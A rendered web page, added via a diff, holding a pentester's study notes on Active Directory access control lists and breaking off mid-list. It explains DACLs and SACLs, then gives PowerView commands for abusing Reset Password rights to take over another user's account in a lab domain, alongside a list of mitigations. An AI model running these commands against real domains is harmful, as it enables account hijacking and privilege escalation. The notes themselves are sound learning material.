@@ -1,0 +1,1731 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.135.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta
+                name="author"
+                content="Bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            AD ACL Access Control List (ACLs) |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
+                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            AD ACL Access Control List (ACLs) -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Posts </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/20240405141322-ad_access_control_list_acls/" title="./posts/20240405141322-ad_access_control_list_acls/">
+                        
+                            AD ACL Access Control List (ACLs)
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/20240404085958-windows_privileges/" title="./posts/20240404085958-windows_privileges/">
+                        
+                            Windows Privileges
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/outdated-box/" title="./outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                AD ACL Access Control List (ACLs)
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                Bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="0001.01.01"
+                            >0001.01.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        12 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/posts/" class="bread-btn">
+    
+
+    
+        Posts
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/posts/20240405141322-ad_access_control_list_acls/" class="bread-btn">
+    
+
+    
+        
+            AD ACL Access Control List (ACLs)
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#access-control-list--acls">Access Control List (ACLs):</a></li>
+    <li><a href="#explicitit-deny-entry">Explicitit Deny Entry:</a></li>
+    <li><a href="#modifying-acls-using">Modifying ACLS using :</a></li>
+    <li><a href="#e22ed2"><del>Enumerating ACLs</del>:</a></li>
+    <li><a href="#a2c4c8"><del>Attacking ACLs</del>:</a></li>
+    <li><a href="#see">See</a>
+      <ul>
+        <li><a href="#ace-tools">ACE Tools:</a></li>
+        <li><a href="#add-a-description-plus-example-scenarios-for-each-of-these"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> add a description + example scenarios for each of these</a></li>
+        <li><a href="#abusing-change-reset-password-permissions">Abusing Change/Reset Password Permissions:</a></li>
+        <li><a href="#abusing-group-membership-management-permissions">Abusing Group Membership Management Permissions:</a></li>
+        <li><a href="#abusing-genericall-permissions">Abusing GenericALl Permissions:</a></li>
+      </ul>
+    </li>
+    <li><a href="#pth-net-rpc-group-addmem">pth-net rpc group addmem</a>
+      <ul>
+        <li></li>
+        <li><a href="#abusing-exessive-user-rights-permissions">Abusing Exessive User Rights Permissions:</a></li>
+        <li><a href="#abusing-addmembers-permissions">Abusing AddMembers Permissions:</a></li>
+        <li><a href="#abusing-addself-permissions">Abusing AddSelf Permissions:</a></li>
+        <li><a href="#abusing-writedacl-permissions">Abusing WriteDACL Permissions:</a></li>
+        <li><a href="#abusing-writeowner-permissions">Abusing WriteOwner Permissions:</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux"><del>Linux</del>:</a>
+      <ul>
+        <li><a href="#abusing-genericwrite-permissions">Abusing GenericWrite Permissions:</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux-1"><del>Linux</del>:</a>
+      <ul>
+        <li><a href="#abusing-allextendedrights-permissions-using">Abusing AllExtendedRights Permissions using :</a></li>
+        <li><a href="#add-user-to-domain-using-powersehll">Add User to Domain using Powersehll: <!-- raw HTML omitted --><!-- raw HTML omitted -->lol<!-- raw HTML omitted --><!-- raw HTML omitted --></a></li>
+        <li><a href="#add-user-to-group-using-powershell">Add User to group using Powershell: <!-- raw HTML omitted --><!-- raw HTML omitted -->lol<!-- raw HTML omitted --><!-- raw HTML omitted --></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <ul>
+<li><del>ACL is a general term used to describe a list of access control entries (ACEs) that define permissions for users or groups</del>:
+<ul>
+<li>Can contain different types of access lists, like DACL and SACL.</li>
+<li>ACL is a broad term encompassing both DACL and SACL.</li>
+</ul>
+</li>
+</ul>
+<h2 id="access-control-list--acls">Access Control List (ACLs):</h2>
+<ul>
+<li></li>
+<li>
+<p><strong>Definition</strong>:</p>
+<ul>
+<li>A list of permissions attached to an object, specifying who or what is allowed to access that object.</li>
+</ul>
+</li>
+<li>
+<p><strong>Use Case</strong>:</p>
+<ul>
+<li>
+<p><!-- raw HTML omitted -->Granularity<!-- raw HTML omitted -->: ACLs are more granular, often attached to specific objects.</p>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Scope<!-- raw HTML omitted -->: ACLs usually apply to specific systems or resources.</p>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Control<!-- raw HTML omitted -->: ACLs can be either discretionary or mandatory.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Overview of Access Control Lists (ACLs)</strong></p>
+<ul>
+<li><!-- raw HTML omitted -->Definition<!-- raw HTML omitted -->: Lists specifying who can access what resource and how.</li>
+<li><!-- raw HTML omitted -->Components<!-- raw HTML omitted -->: Comprised of Access Control Entities (ACEs).</li>
+<li><!-- raw HTML omitted -->Purpose<!-- raw HTML omitted -->: Controlling permissions and auditing.</li>
+</ul>
+</li>
+<li>
+<p><strong>Types of ACLs</strong></p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->Discretionary Access Control List (DACL)<!-- raw HTML omitted -->: Defines permissions, absence grants full rights.</p>
+<ul>
+<li><!-- raw HTML omitted -->DACL<!-- raw HTML omitted -->: Controls who can/cannot access an object.</li>
+<li><figure><img src="/ox-hugo/DACL_example.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>: Logs access attempts.</p>
+<ul>
+<li><!-- raw HTML omitted -->SACL<!-- raw HTML omitted -->: Helps in auditing and monitoring.</li>
+<li><figure><img src="/ox-hugo/SACL_example.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>Vulnerabilities Relevant for Penetration Testing</p>
+<p>Over-permissive ACEs: May lead to privilege escalation.
+Absent or Incorrect DACLs: Can grant full rights to objects.
+Insecure Inheritance Flags: May propagate weak permissions to child objects.</p>
+</li>
+<li>
+<p>Remediation Steps</p>
+<p>Audit Regularly: Regular checks to ensure appropriate configuration.
+Principle of Least Privilege: Grant only essential permissions.
+Educate and Train Staff: Understanding the implications of ACL configurations.</p>
+</li>
+<li>
+<p>Misconfiguration Risks</p>
+<ul>
+<li>Consequence: A slight error can leak permissions and compromise security.</li>
+</ul>
+</li>
+</ul>
+<p>Understanding ACLs and their components is crucial for identifying vulnerabilities in an AD environment, particularly for penetration testers who aim to spot security misconfigurations.</p>
+<h2 id="explicitit-deny-entry">Explicitit Deny Entry:</h2>
+<p>Explicit Deny Entry:</p>
+<ul>
+<li>
+<p>An explicit deny entry in an ACL explicitly forbids certain actions for a user or group.</p>
+</li>
+<li>
+<p>Deny entries take precedence over allow entries.</p>
+</li>
+<li>
+<p>:</p>
+<ul>
+<li>This is a flag used in Windows API calls to open a directory.</li>
+<li>It allows applications with certain privileges to open and read directory contents, even if the application does not have standard read permissions.</li>
+</ul>
+</li>
+<li>
+<p>Effect of Explicit Deny Entry:</p>
+<ul>
+<li>Even when the FILE_FLAG_BACKUP_SEMANTICS flag is used, an explicit deny entry for the current user or their group will override it.</li>
+<li>This means the deny permissions are enforced strictly, preventing access to the folder or file, regardless of the flag.</li>
+</ul>
+</li>
+</ul>
+<h2 id="modifying-acls-using">Modifying ACLS using :</h2>
+<ul>
+<li>Will need the <a href="/posts/20240404085958-windows_privileges/#setakeownershipprivilege">SeTakeOwnershipPrivilege</a> to
+<ul>
+<li>ICACLS Permission Requirements
+<ul>
+<li>
+<p>Administrator Rights</p>
+<ul>
+<li>Full administrative privileges on the system to change file permissions.</li>
+<li>Membership in the Administrators group or equivalent.</li>
+</ul>
+</li>
+<li>
+<p>Ownership or Granted Rights</p>
+<ul>
+<li>Ownership of the file(s) or folder(s) whose permissions are being modified.</li>
+<li>Explicitly granted rights to modify permissions if not the owner.</li>
+</ul>
+</li>
+<li>
+<p>Elevated Command Prompt</p>
+<ul>
+<li>Execution of icacls from an elevated Command Prompt (Run as Administrator) to ensure sufficient privileges.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ul>
+<li><code>Command</code>: icacls &lsquo;C:\&lt;Path&gt;\&lt;To&gt;\&lt;File&gt;&rsquo; /grant &lt;user&gt;:F</li>
+<li><del>Example</del>: icacls &lsquo;C:\Department Shares\Private\IT\cred.txt&rsquo; /grant htb-student:F</li>
+</ul>
+<h2 id="e22ed2"><del>Enumerating ACLs</del>:</h2>
+<ul>
+<li>See</li>
+</ul>
+<h2 id="a2c4c8"><del>Attacking ACLs</del>:</h2>
+<ul>
+<li>
+<h2 id="see">See</h2>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<h3 id="ace-tools">ACE Tools:</h3>
+<h4 id="d41d8c"></h4>
+<h3 id="add-a-description-plus-example-scenarios-for-each-of-these"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> add a description + example scenarios for each of these</h3>
+<h3 id="abusing-change-reset-password-permissions">Abusing Change/Reset Password Permissions:</h3>
+<h4 id="abusing-change-reset-password-permissions-to-reset-change-password-using">Abusing Change/Reset Password Permissions to reset/change password using :</h4>
+<ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/f4f5fb1460a8163e333c9e5462df6d3ab27a53a6/docs/Recon/Set-DomainUserPassword.md">https://github.com/PowerShellMafia/PowerSploit/blob/f4f5fb1460a8163e333c9e5462df6d3ab27a53a6/docs/Recon/Set-DomainUserPassword.md</a></li>
+<li><strong>Permissions</strong>:
+<ul>
+<li>&ldquo;Reset Password&rdquo;: Allows an object to reset another object&rsquo;s password.</li>
+<li>&ldquo;Change Password&rdquo;: Allows an object to change its own password.</li>
+</ul>
+</li>
+<li>Potential Risks If an Attacker Gains Reset Password Permission
+<ol>
+<li>Account Hijacking:
+<ul>
+<li>Attacker can reset passwords and gain control of user accounts.</li>
+</ul>
+</li>
+<li>Privilege Escalation:
+<ul>
+<li>Reset the password of a high-privilege account for unauthorized access.</li>
+</ul>
+</li>
+<li>Data Access:
+<ul>
+<li>Unauthorized access to sensitive or restricted information.</li>
+</ul>
+</li>
+<li>Disruption of Service:
+<ul>
+<li>May reset passwords for critical service accounts, causing outages.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ul>
+<li><del>In this example scenario we have</del>:
+<ul>
+<li>Control over <code>&lt;current_user&gt;/wley</code> who has the rights to change the password for the <code>&lt;target_user&gt;/damundsen</code>.
+<ul>
+<li>This means we know <code>&lt;current_user&gt;/wley's</code> password by some methods.</li>
+</ul>
+</li>
+<li><del>Attack Aim</del>: Change the password of the <code>&lt;target_user&gt;/damundsen</code> so we can move laterally/vertically.</li>
+</ul>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->__<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p><strong>Create Credentialed Object for</strong> <code>&lt;current_user&gt;</code></p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->Convert password to<!-- raw HTML omitted --> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0">SecureString</a>:</p>
+<ul>
+<li><code>Command</code>: $SecPassword = ConvertTo-SecureString &lsquo;&lt;KnownPasswordHere&gt;&rsquo; -AsPlainText -Force</li>
+<li><del>Example</del>: $SecPassword = ConvertTo-SecureString &rsquo;transporter@4&rsquo; -AsPlainText -Force</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Create<!-- raw HTML omitted --> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.3.0&amp;viewFallbackFrom=powershellsdk-7.0.0">credential object</a> <!-- raw HTML omitted -->for<!-- raw HTML omitted --> <code>&lt;current_user&gt;</code>:</p>
+<ul>
+<li><code>Command</code>: $Cred = New-Object System.Management.Automation.PSCredential(&rsquo;&lt;domainName&gt;\&lt;current_user&gt;&rsquo;, $SecPassword)</li>
+<li><del>Example</del>: $Cred = New-Object System.Management.Automation.PSCredential(&lsquo;INLANEFREIGHT\wley&rsquo;, $SecPassword)</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>Set our new Password for</strong> <code>&lt;target_user&gt;</code></p>
+<ul>
+<li><!-- raw HTML omitted -->Create new<!-- raw HTML omitted --> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0">SecureString</a> <!-- raw HTML omitted -->password for <code>&lt;target_user&gt;</code>.<!-- raw HTML omitted -->
+<ul>
+<li><code>Command</code>: $targetUserPassword = ConvertTo-SecureString &lsquo;&lt;AnyPasswordWechoose&gt;&rsquo; -AsPlainText -Force</li>
+<li><del>Example</del>: $targetUserPassword = ConvertTo-SecureString &lsquo;Pwn3d_by_ACLs!&rsquo; -AsPlainText -Force</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Changing <code>&lt;target_user&gt;</code> password</strong>:</p>
+<ul>
+<li><!-- raw HTML omitted -->Set <code>&lt;target_user&gt;</code> password using <code>&lt;current_user&gt;</code> credentials using<!-- raw HTML omitted --> .
+<ul>
+<li><code>Commands</code>:
+<ol>
+<li>Import-Module .\PowerView.ps1</li>
+<li>Set-DomainUserPassword -Identity &lt;target_user&gt; -AccountPassword $targetUserPassword -Credential $Cred -Verbose</li>
+</ol>
+</li>
+<li><del>Example</del>: Set-DomainUserPassword -Identity damundsen -AccountPassword $targetUserPassword -Credential $Cred -Verbose</li>
+<li><del>Notes</del>:
+<ul>
+<li>Always use the -Verbose flag to see if any issues arise so we can troubleshoot.
+We shoot get an output like the below:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>         VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [Get-PrincipalContext] Using alternate credentials
+</span></span><span style="display:flex;"><span>         VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [Set-DomainUserPassword] Attempting to set the password <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;&lt;target_user&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>         VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [Set-DomainUserPassword] Password <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;&lt;target_users&gt;&#39;</span> successfully reset</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Mitigation Strategies</strong>:</p>
+<ul>
+<li>
+<p>Auditing and Monitoring:</p>
+<ul>
+<li>Keep an eye on reset password activities through logs.</li>
+</ul>
+</li>
+<li>
+<p>Least Privilege Principle:</p>
+<ul>
+<li>Limit &ldquo;Reset Password&rdquo; permission to a minimal set of admin accounts.</li>
+</ul>
+</li>
+<li>
